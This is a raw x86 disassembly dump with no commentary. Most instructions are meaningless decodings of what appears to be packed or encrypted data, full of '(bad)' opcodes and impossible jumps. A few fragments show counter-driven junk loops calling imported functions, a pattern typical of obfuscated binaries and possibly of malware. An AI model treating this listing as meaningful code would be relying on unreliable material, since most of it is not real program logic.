  4067fc:	adc    DWORD PTR [esi],esp
  4067fe:	or     ecx,ecx
  406800:	inc    esi
  406801:	and    cl,bh
  406803:	or     al,0xd1
  406805:	inc    ebp
  406806:	pop    esi
  406807:	nop
  406808:	jnp    0x40680f
  40680a:	out    dx,eax
  40680b:	popa   
  40680c:	inc    esp
  40680d:	fdivr  DWORD PTR [esi]
  40680f:	push   ss
  406810:	push   esi
  406811:	dec    edx
  406812:	lock imul eax,DWORD PTR [eax-0x6f4d6ad5],0x987d5df7
  40681d:	adc    al,0x73
  40681f:	push   esp
  406820:	sbb    dl,BYTE PTR [ecx+0x53b17b4d]
  406826:	ss in  al,dx
  406828:	adc    ah,dl
  40682a:	rcl    BYTE PTR ss:[ecx+0x5b],0x62
  40682f:	fsub   st,st(3)
  406831:	mov    bl,0x6
  406833:	dec    eax
  406834:	push   ebx
  406835:	out    dx,al
  406836:	pop    eax
  406837:	popa   
  406838:	and    BYTE PTR [edi-0x76],bh
  40683b:	in     al,dx
  40683c:	pop    es
  40683d:	ror    ebx,cl
  40683f:	imul   edx,DWORD PTR [eax+0x45eb6e37],0xd9d9f091
  406849:	jle    0x40687d
  40684b:	adc    DWORD PTR [edx-0x44],edi
  40684e:	call   0x3666:0xfff83a73
  406855:	iret   
  406856:	jmp    0x4068d7
  406858:	push   0xa8de6d26
  40685d:	mov    ch,0x6f
  40685f:	push   esp
  406860:	das    
  406861:	push   esi
  406862:	pop    ds
  406863:	loop   0x4068a5
  406865:	test   ah,cl
  406867:	test   ebx,eax
  406869:	test   al,0xe7
  40686b:	sub    eax,DWORD PTR [esi]
  40686d:	icebp  
  40686e:	sub    ah,dh
  406870:	mov    bl,0x24
  406872:	mov    cl,0xb
  406874:	inc    ebp
  406875:	and    al,0xea
  406877:	xchg   esp,eax
  406878:	leave  
  406879:	arpl   WORD PTR [edx],dx
  40687b:	cli    
  40687c:	aam    0x15
  40687e:	fdivr  QWORD PTR [edx+0xd]
  406881:	mov    ch,0xd5
  406883:	pop    ebp
  406884:	out    dx,eax
  406885:	pusha  
  406886:	jmp    0x25689c40
  40688b:	or     eax,0x2b2743d4
  406890:	inc    ebx
  406891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406892:	(bad)  
  406893:	cli    
  406894:	add    edi,DWORD PTR [ebp+0x1f15d8bf]
  40689a:	dec    ebp
  40689b:	xor    al,0x5b
  40689d:	fldcw  WORD PTR [ecx+esi*1+0x780628ab]
  4068a4:	sbb    dh,cl
  4068a6:	pop    ss
  4068a7:	inc    edx
  4068a8:	leave  
  4068a9:	enter  0xa715,0xc3
  4068ad:	in     eax,dx
  4068ae:	xor    DWORD PTR [edi+esi*4+0x2334ddc4],edi
  4068b5:	or     eax,0xffffffa4
  4068b8:	mov    cl,0x34
  4068ba:	push   es
  4068bb:	push   ecx
  4068bc:	jno    0x4068ae
  4068be:	jecxz  0x406897
  4068c0:	dec    BYTE PTR [edi]
  4068c2:	das    
  4068c3:	xchg   BYTE PTR [esp+edx*8],dl
  4068c6:	cli    
  4068c7:	jecxz  0x40686a
  4068c9:	mov    DWORD PTR [eax-0x18113155],eax
  4068cf:	add    ebx,ebx
  4068d1:	les    esi,FWORD PTR cs:[ecx]
  4068d4:	pop    ebp
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7dd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7dd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7dd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaca
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7dd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7dd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7dd,eax
  406931:	mov    eax,ds:0x42a7dd
  406936:	dec    eax
  406937:	mov    ds:0x42a7dd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a789,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	dec    eax
  40695c:	cli    
  40695d:	and    ecx,esi
  40695f:	add    cl,cl
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x40698e
  406968:	pushf  
  406969:	test   BYTE PTR cs:[eax-0x40f9b5eb],cl
  406970:	es add eax,edx
  406973:	and    bh,BYTE PTR [edi+0x2a14d4b9]
  406979:	adc    eax,0x3f2d0b34
  40697e:	ret    
  40697f:	stos   BYTE PTR es:[edi],al
  406980:	lea    ebx,[edx+eax*2+0x7a]
  406984:	jmp    0x47c4cdbc
  406989:	xchg   DWORD PTR [edx+0x788c0b01],edi
  40698f:	jmp    0x27fb:0x5596f4a8
  406996:	pop    ebx
  406997:	in     al,dx
  406998:	or     eax,ebx
  40699a:	inc    edx
  40699b:	inc    eax
  40699c:	std    
  40699d:	cdq    
  40699e:	xchg   esp,eax
  40699f:	shr    DWORD PTR [edi],0x5b
  4069a2:	ret    
  4069a3:	push   ds
  4069a4:	mov    ebx,0xb4b84690
  4069a9:	mov    ds:0x4076acca,al
  4069ae:	and    ecx,eax
  4069b0:	xchg   ecx,eax
  4069b1:	aaa    
  4069b2:	or     cl,cl
  4069b4:	push   ecx
  4069b5:	pop    ds
  4069b6:	xor    BYTE PTR [esi],0x32
  4069b9:	outs   dx,DWORD PTR ds:[esi]
  4069ba:	or     DWORD PTR [edx],ebp
  4069bc:	mov    DWORD PTR [edx],0xadb97809
  4069c2:	jle    0x40695a
  4069c4:	dec    DWORD PTR [edi-0x28]
  4069c7:	sub    al,0x77
  4069c9:	mov    esp,0xf90d4747
  4069ce:	fld    TBYTE PTR [ecx]
  4069d0:	imul   esi,DWORD PTR [ebp+0x30],0xd190c99f
  4069d7:	popf   
  4069d8:	pop    eax
  4069d9:	dec    ebx
  4069da:	pop    esi
  4069db:	dec    esi
  4069dc:	dec    ebx
  4069dd:	les    edi,FWORD PTR [ebx-0x48648ade]
  4069e3:	push   cs
  4069e4:	iret   
  4069e5:	dec    ecx
  4069e6:	ins    DWORD PTR es:[edi],dx
  4069e7:	cs sub al,0xbc
  4069ea:	xor    al,0xcc
  4069ec:	mov    dl,0x9c
  4069ee:	adc    bh,dl
  4069f0:	loopne 0x4069dc
  4069f2:	inc    ebp
  4069f3:	xor    esp,DWORD PTR [esi]
  4069f5:	shl    BYTE PTR [ebx+0x724b6a4d],0xd7
  4069fc:	popaw  
  4069fe:	int    0xf4
  406a00:	add    al,0x8f
  406a02:	inc    esp
  406a03:	xchg   ebp,eax
  406a04:	mov    al,ds:0x8f8bbd35
  406a09:	xchg   ecx,eax
  406a0a:	xor    eax,0x3e47abb2
  406a0f:	test   DWORD PTR [ecx-0x5c320e56],0x2df1b496
  406a19:	cli    
  406a1a:	jmp    0x1351:0x6631c215
  406a21:	es mov ecx,0xd3877c7b
  406a27:	fmul   QWORD PTR [esi-0x1c0a5e1d]
  406a2d:	push   ds
  406a2e:	daa    
  406a2f:	test   BYTE PTR ds:0x9c0087c6,ch
  406a35:	pushf  
  406a36:	sbb    DWORD PTR [ebx+eax*4+0x38],0xffffff84
  406a3b:	or     bh,dh
  406a3d:	gs sub cl,cl
  406a40:	cwde   
  406a41:	bound  esp,QWORD PTR [esi]
  406a43:	push   eax
  406a44:	std    
  406a45:	sub    edi,DWORD PTR [edx+0x53]
  406a48:	fistp  QWORD PTR [ecx-0x6d]
  406a4b:	fild   WORD PTR [esi-0x79]
  406a4e:	xchg   ecx,eax
  406a4f:	jg     0x4069f3
  406a51:	icebp  
  406a52:	push   edx
  406a53:	mov    ds:0xd4ba1d35,eax
  406a58:	test   al,0x9
  406a5a:	stc    
  406a5b:	pop    ebx
  406a5c:	mov    esp,0x8aa41fca
  406a61:	loop   0x406ac9
  406a63:	add    BYTE PTR [edx+eax*8+0x56b4fa53],bh
  406a6a:	nop
  406a6b:	(bad)  
  406a6c:	lahf   
  406a6d:	cmp    BYTE PTR [edi],ah
  406a6f:	mov    ecx,DWORD PTR [ecx+0x2e]
  406a72:	in     eax,dx
  406a73:	ficom  WORD PTR [eax-0x79]
  406a76:	cs pop ebp
  406a78:	xor    al,0x54
  406a7a:	sbb    DWORD PTR cs:[edx+0x5d],edx
  406a7e:	fild   DWORD PTR [eax-0x7e]
  406a81:	data16 mov ch,0xdb
  406a84:	test   eax,0x1001f297
  406a89:	adc    eax,0x5a497077
  406a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a8f:	push   esp
  406a90:	inc    ecx
  406a91:	lock mov al,ds:0xd621c2a1
  406a97:	sahf   
  406a98:	sar    BYTE PTR [ebp+0x31],cl
  406a9b:	shl    DWORD PTR [ebx-0xf],0x8b
  406a9f:	dec    ebx
  406aa0:	inc    esp
  406aa1:	sub    bh,BYTE PTR [eax]
  406aa3:	(bad)  
  406aa4:	lahf   
  406aa5:	mov    es,WORD PTR [eax+edi*1]
  406aa8:	inc    ecx
  406aa9:	fst    QWORD PTR [edi+0x1871640]
  406aaf:	inc    edx
  406ab0:	mov    ebx,0x3e2a2e13
  406ab5:	and    DWORD PTR [edx+0x1f],edx
  406ab8:	stc    
  406ab9:	jl     0x406ace
  406abb:	mov    dh,BYTE PTR [ecx+ebx*1-0x446ff2c4]
  406ac2:	fild   WORD PTR [eax-0x27]
  406ac5:	aam    0xe
  406ac7:	(bad)  
  406ac8:	xchg   ebp,eax
  406ac9:	mov    ecx,0x6a1c284f
  406ace:	xor    eax,0x5969da34
  406ad3:	mov    ecx,0xa47c035d
  406ad8:	(bad)  
  406ad9:	sti    
  406ada:	loope  0x406b24
  406adc:	and    al,0xd8
  406ade:	cmp    eax,0x3d0f6295
  406ae3:	or     DWORD PTR [ebx+edx*4],esp
  406ae6:	mov    esi,0xf0a3640b
  406aeb:	xchg   DWORD PTR [ebx+ebp*1+0x50f1667b],esi
  406af2:	xchg   DWORD PTR [esi],esp
  406af4:	fstp   QWORD PTR [eax-0x7b9978e9]
  406afa:	jb     0x406ade
  406afc:	add    al,ch
  406afe:	mov    edx,0x7bd16973
  406b03:	push   0x75
  406b05:	imul   edi,DWORD PTR [edi-0x5d],0xffffffb6
  406b09:	imul   edi,edx,0x7c1bb91c
  406b0f:	sub    cl,BYTE PTR [eax-0x793d471a]
  406b15:	dec    esp
  406b16:	out    dx,eax
  406b17:	jecxz  0x406b08
  406b19:	leave  
  406b1a:	minps  xmm0,XMMWORD PTR [ecx-0x47]
  406b1e:	sbb    ah,BYTE PTR [edi]
  406b20:	imul   edx,DWORD PTR [eax+ebp*8+0x2b],0x35
  406b25:	adc    esp,esi
  406b27:	add    BYTE PTR [esi],ah
  406b29:	shr    al,1
  406b2b:	or     DWORD PTR [eax-0x5f1353cd],ebp
  406b31:	xor    ebp,DWORD PTR [edx-0xd]
  406b34:	xor    edi,ebx
  406b36:	xor    BYTE PTR [edx-0x8],al
  406b39:	mov    ebx,0x760621b2
  406b3e:	repz ret 0xb545
  406b42:	clc    
  406b43:	mov    ecx,0x27a04dcc
  406b48:	clc    
  406b49:	enter  0x3a30,0xca
  406b4d:	ss aam 0x64
  406b50:	ja     0x406b88
  406b52:	out    0xf7,eax
  406b54:	add    BYTE PTR [esi+0x5d],dh
  406b57:	cmp    DWORD PTR [ebx+0x68],esp
  406b5a:	sub    edi,ecx
  406b5c:	or     eax,0xb58d89c6
  406b61:	and    al,BYTE PTR [ecx]
  406b63:	cmc    
  406b64:	popa   
  406b65:	fbld   TBYTE PTR [edx-0x17]
  406b68:	and    eax,0x60df9e04
  406b6d:	dec    esp
  406b6e:	xor    DWORD PTR [eax+0x306a579],edi
  406b74:	sbb    eax,0x90ece517
  406b79:	xor    dl,bh
  406b7b:	jae    0x406bdc
  406b7d:	(bad)  
  406b7e:	out    dx,al
  406b7f:	sar    DWORD PTR [ecx+0x3318ac6f],cl
  406b85:	pop    edx
  406b86:	xlat   BYTE PTR ds:[ebx]
  406b87:	push   esi
  406b88:	and    BYTE PTR [ebx+0xd],ch
  406b8b:	push   edi
  406b8c:	jns    0x406b66
  406b8e:	push   edi
  406b8f:	mov    ecx,0xeaebd293
  406b94:	mov    ecx,0xcab85d84
  406b99:	pop    esi
  406b9a:	lods   eax,DWORD PTR ds:[esi]
  406b9b:	clc    
  406b9c:	fucom  st(4)
  406b9e:	ret    0x937a
  406ba1:	call   0x3abe:0x3a0caa1d
  406ba8:	std    
  406ba9:	cmp    ah,BYTE PTR [edi]
  406bab:	push   ebx
  406bac:	mov    cl,0xdc
  406bae:	cld    
  406baf:	ss cmp dh,BYTE PTR fs:[eax-0x779f7dd]
  406bb7:	out    0xcc,al
  406bb9:	lahf   
  406bba:	loop   0x406bec
  406bbc:	mov    WORD PTR [edi],?
  406bbe:	jno    0x406bff
  406bc0:	sub    ebp,edi
  406bc2:	jmp    0x8f9792a0
  406bc7:	pop    ecx
  406bc8:	hlt    
  406bc9:	test   DWORD PTR [ebx-0x21],0x178c7ea0
  406bd0:	inc    ecx
  406bd1:	cmp    dh,dl
  406bd3:	pop    ecx
  406bd4:	and    eax,0x692d7461
  406bd9:	mov    esi,0xbf14a4c2
  406bde:	sahf   
  406bdf:	ret    0xf190
  406be2:	loope  0x406bf5
  406be4:	inc    ebx
  406be5:	push   edi
  406be6:	mov    ebx,0xe489f735
  406beb:	xchg   ecx,esp
  406bed:	xor    DWORD PTR [edx],eax
  406bef:	mov    cl,0xac
  406bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bf2:	test   eax,0xebbf007f
  406bf7:	jmp    0xc7def69b
  406bfc:	iret   
  406bfd:	jbe    0x406c63
  406bff:	retf   0x9912
  406c02:	mov    dl,0x18
  406c04:	out    dx,al
  406c05:	retf   
  406c06:	mov    ds:0x5ffa81d0,eax
  406c0b:	lock xchg esi,eax
  406c0d:	xor    eax,eax
  406c0f:	out    0xb1,al
  406c11:	mov    al,ds:0x24cdcde7
  406c16:	push   0x62
  406c18:	call   0x4aca:0xbc978d8b
  406c1f:	int3   
  406c20:	push   cs
  406c21:	stos   BYTE PTR es:[edi],al
  406c22:	stos   BYTE PTR es:[edi],al
  406c23:	sahf   
  406c24:	(bad)  [esi-0x14]
  406c27:	sbb    eax,0x7df19c36
  406c2c:	jp     0x406c80
  406c2e:	mov    ds:0xba643f35,al
  406c33:	jnp    0x406c6b
  406c35:	jle    0x406bd4
  406c37:	pop    edx
  406c38:	and    al,0x2d
  406c3a:	cmp    edi,DWORD PTR [eax+0x7ca0c2b7]
  406c40:	add    ebp,DWORD PTR [ebx-0x29]
  406c43:	mov    WORD PTR [ebx-0x4e],?
  406c46:	je     0x406bc8
  406c48:	mov    edx,0x1ddb053c
  406c4d:	setg   BYTE PTR [eax-0x47a883af]
  406c54:	mov    al,BYTE PTR ss:[eax]
  406c57:	add    BYTE PTR [ecx+0x42a7e915],al
  406c5d:	add    dl,ch
  406c5f:	dec    edi
  406c60:	add    BYTE PTR [eax],al
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a815,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a86d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x22],ebx
  406c91:	cs out dx,eax
  406c93:	or     eax,0x7878cf6c
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406cf6
  406c9d:	(bad)
  406ca2:	push   eax
  406ca3:	jg     0x406cb1
  406ca5:	xchg   ebp,eax
  406ca6:	in     al,0xe4
  406ca8:	mov    eax,ds:0x56a6f426
  406cad:	ret    
  406cae:	pop    edx
  406caf:	jmp    0x3d55006
  406cb4:	dec    esi
  406cb5:	jno    0x406cba
  406cb7:	scas   eax,DWORD PTR es:[edi]
  406cb8:	xor    BYTE PTR [esi-0x20235472],0x3c
  406cbf:	sub    bh,bh
  406cc1:	xchg   ecx,eax
  406cc2:	push   ebp
  406cc3:	push   es
  406cc4:	pop    ebp
  406cc5:	mov    bl,0x8
  406cc7:	jmp    0x188c:0xeafd8603
  406cce:	aaa    
  406ccf:	jmp    0xa920:0x2971f50a
  406cd6:	add    al,0xd6
  406cd8:	sub    dl,bh
  406cda:	add    eax,0x9bd60f23
  406cdf:	popf   
  406ce0:	lock xor ch,BYTE PTR [esi+ecx*2-0x5b62b1ab]
  406ce8:	adc    DWORD PTR [ebx-0x3bf9d22e],ecx
  406cee:	xchg   ecx,eax
  406cef:	icebp  
  406cf0:	mov    eax,0x86deb624
  406cf5:	mov    BYTE PTR [ebx+0x24],ch
  406cf8:	jbe    0x406d12
  406cfa:	iret   
  406cfb:	xlat   BYTE PTR ds:[ebx]
  406cfc:	adc    al,0x97
  406cfe:	and    al,0xaf
  406d00:	fidivr DWORD PTR [ecx-0x3f13a3e4]
  406d06:	lahf   
  406d07:	mov    ebp,0x595a8945
  406d0c:	add    eax,0x5bfcac79
  406d11:	mov    dl,0x5c
  406d13:	(bad)
  406d16:	in     eax,dx
  406d17:	sbb    eax,0x95451885
  406d1c:	sub    DWORD PTR [edx-0x1678bb09],esi
  406d22:	sbb    al,0xf7
  406d24:	js     0x406ce6
  406d26:	rol    DWORD PTR [edx-0x5e593244],0xbf
  406d2d:	mov    ah,0x4
  406d2f:	stos   DWORD PTR es:[edi],eax
  406d30:	daa    
  406d31:	aas    
  406d32:	push   esp
  406d33:	push   esi
  406d34:	inc    esi
  406d35:	push   cs
  406d36:	pop    ecx
  406d37:	leave  
  406d38:	lock jecxz 0x406cc6
  406d3b:	cmp    eax,0x95136c38
  406d40:	rcl    BYTE PTR [edx+0x24],1
  406d43:	or     dl,al
  406d45:	and    BYTE PTR [edi],0xab
  406d48:	or     ch,BYTE PTR [ebx]
  406d4a:	es in  al,dx
  406d4c:	sbb    al,al
  406d4e:	sbb    DWORD PTR [ebp-0x752222b5],ebp
  406d54:	int    0x4b
  406d56:	aas    
  406d57:	add    BYTE PTR [edx],bl
  406d59:	lea    edi,[eax+0x2e]
  406d5c:	mov    ds:0x679ddf0c,al
  406d61:	jmp    0x75b5:0xd4b33ac
  406d68:	call   0xfa45d76a
  406d6d:	jmp    0xb3a5:0x82f45029
  406d74:	scas   eax,DWORD PTR es:[edi]
  406d75:	adc    eax,0x833ee203
  406d7a:	into   
  406d7b:	gs sub edi,esi
  406d7e:	sar    dl,cl
  406d80:	es xchg ecx,eax
  406d82:	push   edi
  406d83:	adc    al,0x7f
  406d85:	jmp    0x54cd3eae
  406d8a:	fild   DWORD PTR [ecx]
  406d8c:	push   edi
  406d8d:	in     al,dx
  406d8e:	push   0xffffff85
  406d90:	mov    ah,0x77
  406d92:	inc    ebp
  406d93:	outs   dx,DWORD PTR ds:[esi]
  406d94:	jbe    0x406dc5
  406d96:	(bad)  
  406d97:	dec    ecx
  406d98:	fidivr DWORD PTR [ebp-0x2666d797]
  406d9e:	repz jg 0x406dc6
  406da1:	fiadd  DWORD PTR [ecx+0x3f0e0b2a]
  406da7:	cmp    DWORD PTR [ebx+0x61cb5d84],ecx
  406dad:	add    bl,bh
  406daf:	gs in  eax,dx
  406db1:	nop
  406db2:	enter  0xaef6,0xc8
  406db6:	fist   DWORD PTR [edx+0xa]
  406db9:	lods   al,BYTE PTR ds:[esi]
  406dba:	mov    dh,0xcc
  406dbc:	cwde   
  406dbd:	(bad)  
  406dbe:	mov    ebp,0xc80fc3b4
  406dc3:	inc    ebp
  406dc4:	out    dx,eax
  406dc5:	mov    esp,0xce711572
  406dca:	mov    DWORD PTR [esi],esi
  406dcc:	jne    0x406df1
  406dce:	cmc    
  406dcf:	sti    
  406dd0:	fs push ecx
  406dd2:	adc    BYTE PTR [ecx+0x1f],cl
  406dd5:	adc    ecx,edi
  406dd7:	int3   
  406dd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dd9:	aas    
  406dda:	sahf   
  406ddb:	or     esi,DWORD PTR [edi+0x33]
  406dde:	cmp    ebp,esi
  406de0:	sbb    bh,BYTE PTR [edx]
  406de2:	test   eax,0xeebc9917
  406de7:	sbb    ebx,esi
  406de9:	adc    al,0x28
  406deb:	shl    edi,cl
  406ded:	idiv   BYTE PTR ds:0x8d2bd2b2
  406df3:	stc    
  406df4:	shl    edx,cl
  406df6:	nop
  406df7:	xchg   edi,eax
  406df8:	xchg   BYTE PTR [esp+eiz*8],cl
  406dfb:	cmp    BYTE PTR [ebp+edi*2-0x4dc24500],0x8c
  406e03:	maskmovq mm5,(bad)
  406e04:	imul   DWORD PTR [ebx]
  406e06:	jne    0x406e30
  406e08:	jnp    0x406e78
  406e0a:	xor    BYTE PTR [ebx],ah
  406e0c:	add    BYTE PTR [eax],0x94
  406e0f:	out    0x11,eax
  406e11:	mov    dl,0x1a
  406e13:	imul   esi,DWORD PTR [ecx+0x31],0x79535bd0
  406e1a:	or     bh,ch
  406e1c:	adc    BYTE PTR cs:[esi+0xc],0x7f
  406e21:	(bad)  
  406e22:	pop    ecx
  406e23:	pusha  
  406e24:	mov    ds:0x5d5eda78,al
  406e29:	xchg   ebx,eax
  406e2a:	sbb    al,0xd6
  406e2c:	mov    dl,bl
  406e2e:	mov    ch,0x6d
  406e30:	lea    edx,[eax-0x49]
  406e33:	xor    al,0x16
  406e35:	cmp    ch,al
  406e37:	adc    al,0xb3
  406e39:	stos   BYTE PTR es:[edi],al
  406e3a:	cwde   
  406e3b:	mul    esp
  406e3d:	ffreep st(3)
  406e3f:	icebp  
  406e40:	call   0x6af5e275
  406e45:	mov    bl,0xbd
  406e47:	shl    ebp,1
  406e49:	inc    edx
  406e4a:	ins    DWORD PTR es:[edi],dx
  406e4b:	xor    dl,BYTE PTR [esi-0xebd09a]
  406e51:	sub    BYTE PTR [ecx+0x74],0xa6
  406e55:	or     al,BYTE PTR [edi]
  406e57:	xor    edx,DWORD PTR [eax-0x3e4ffc53]
  406e5d:	jo     0x406eb0
  406e5f:	out    0x8e,eax
  406e61:	icebp  
  406e62:	jmp    0x429ef19c
  406e67:	rol    BYTE PTR [edx+0x6e],0x1a
  406e6b:	and    dl,BYTE PTR [eax+0x70da4daa]
  406e71:	dec    ebp
  406e72:	loop   0x406df7
  406e74:	jae    0x406e8e
  406e76:	bnd call 0x9c20477
  406e7c:	clc    
  406e7d:	or     ebp,DWORD PTR [edi+0x7]
  406e80:	cmp    bh,BYTE PTR [edx]
  406e82:	adc    al,0x15
  406e84:	cmp    ch,0x2d
  406e87:	aaa    
  406e88:	bound  ebx,QWORD PTR [eax]
  406e8a:	mov    eax,ds:0xbdd891a0
  406e8f:	arpl   WORD PTR [ecx+0x63],dx
  406e92:	pop    ds
  406e93:	(bad)  
  406e94:	jecxz  0x406e59
  406e96:	loopne 0x406eac
  406e98:	(bad)  
  406e99:	xchg   esi,eax
  406e9a:	arpl   WORD PTR [ebx],di
  406e9c:	xor    al,0xb9
  406e9e:	push   edx
  406e9f:	mov    ebx,0xe2ad9d0
  406ea4:	popf   
  406ea5:	movq   mm2,QWORD PTR [ebx]
  406ea8:	mov    dl,BYTE PTR ds:0x6a07496a
  406eae:	les    ecx,FWORD PTR [ecx-0x23]
  406eb1:	xchg   ebp,eax
  406eb2:	retf   0xd639
  406eb5:	mov    ds:0x610a3c45,al
  406eba:	push   ebp
  406ebb:	inc    ecx
  406ebc:	jmp    0x82b33c01
  406ec1:	scas   eax,DWORD PTR es:[edi]
  406ec2:	dec    esi
  406ec3:	mov    eax,0x718e79f
  406ec8:	int3   
  406ec9:	bound  ebx,QWORD PTR [edi+0x64]
  406ecc:	add    al,bl
  406ece:	mov    dh,0x5e
  406ed0:	add    cl,dl
  406ed2:	and    eax,0x6d37af94
  406ed7:	mov    ecx,0x32da779d
  406edc:	dec    ecx
  406edd:	ins    BYTE PTR es:[edi],dx
  406ede:	push   ecx
  406edf:	xor    cl,BYTE PTR [ebx+eax*2-0x4e]
  406ee3:	stos   DWORD PTR es:[edi],eax
  406ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ee5:	mov    edx,0xd6eecac6
  406eea:	jnp    0x406eb3
  406eec:	ins    DWORD PTR es:[edi],dx
  406eed:	dec    ebp
  406eee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eef:	aaa    
  406ef0:	jmp    0x3458b54a
  406ef5:	sbb    dl,bh
  406ef7:	test   DWORD PTR [ecx+0x6d],edi
  406efa:	and    al,0xc8
  406efc:	in     eax,dx
  406efd:	sub    al,BYTE PTR [esi-0xc1d68d9]
  406f03:	stos   DWORD PTR es:[edi],eax
  406f04:	inc    edx
  406f05:	or     BYTE PTR [eax+0x6f],cl
  406f08:	cwde   
  406f09:	cmp    ah,dh
  406f0b:	jg     0x406f69
  406f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f0e:	jecxz  0x406f71
  406f10:	call   0xc88e6a01
  406f15:	outs   dx,BYTE PTR ds:[esi]
  406f16:	add    DWORD PTR [esi-0x2688f8bb],eax
  406f1c:	mov    al,0xf6
  406f1e:	pop    esp
  406f1f:	(bad)
  406f22:	pop    ss
  406f23:	push   ecx
  406f24:	in     eax,0xa8
  406f26:	call   0x3e70:0xccc530a9
  406f2d:	int    0xb7
  406f2f:	mov    eax,0xa4471a55
  406f34:	fld    TBYTE PTR [ecx]
  406f36:	cmp    BYTE PTR [esi-0x4a],0x7d
  406f3a:	(bad)  
  406f3b:	mov    dl,0xa7
  406f3d:	int    0x3f
  406f3f:	in     eax,dx
  406f40:	mov    dh,0xfd
  406f42:	xlat   BYTE PTR ds:[ebx]
  406f43:	stos   BYTE PTR es:[edi],al
  406f44:	or     BYTE PTR [eax],dl
  406f46:	mov    dh,ah
  406f48:	aam    0xb5
  406f4a:	lds    ecx,FWORD PTR [ebx+edi*1+0x3c]
  406f4e:	in     al,dx
  406f4f:	dec    esp
  406f50:	in     eax,dx
  406f51:	xchg   BYTE PTR [ebp+0x0],bh
  406f54:	(bad)  
  406f55:	jae    0x406f19
  406f57:	jns    0x406f8f
  406f59:	mov    ds:0xe8df2057,eax
  406f5e:	xchg   esi,eax
  406f5f:	pusha  
  406f60:	inc    eax
  406f61:	jecxz  0x406f50
  406f63:	(bad)  [edi+0x446e29ae]
  406f69:	xor    ch,dl
  406f6b:	(bad)  
  406f6c:	cmp    BYTE PTR [edi+ecx*1],bl
  406f6f:	ror    BYTE PTR [ebp+0xf931e4b],0xd0
  406f76:	iret   
  406f77:	cmp    al,al
  406f79:	pushf  
  406f7a:	es enter 0xac3c,0x37
  406f7f:	adc    al,0x54
  406f81:	icebp  
  406f82:	(bad)  
  406f83:	out    dx,eax
  406f84:	cmp    eax,0x66a0b5bf
  406f89:	add    eax,ecx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a8a1
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a8a5,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a8a5
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a8a5,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a8a5,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a8a5,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab42
  406fd4:	push   0x42ab42
  406fd9:	push   0x42ab24
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a8a5,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a8a5
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a8a5,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7e9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a78d
  407014:	sub    DWORD PTR ds:0x42a861,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0xee,al
  40702c:	jge    0x407029
  40702e:	or     al,0x58
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407084
  407038:	(bad)  
  407039:	or     al,0x35
  40703b:	scas   al,BYTE PTR es:[edi]
  40703c:	pop    ds
  40703d:	aaa    
  40703e:	iret   
  40703f:	aad    0xdf
  407041:	adc    ah,cl
  407043:	test   DWORD PTR [ebp+0x7d5c9ad8],ebp
  407049:	call   0x797f:0x84df7b12
  407050:	daa    
  407051:	pop    eax
  407052:	fnclex 
  407054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407055:	sbb    al,0xff
  407057:	inc    edx
  407058:	cmp    eax,eax
  40705a:	bound  edx,QWORD PTR [edx-0x41]
  40705d:	and    al,0x5b
  40705f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407060:	sub    BYTE PTR [esi-0x951d6fb],dh
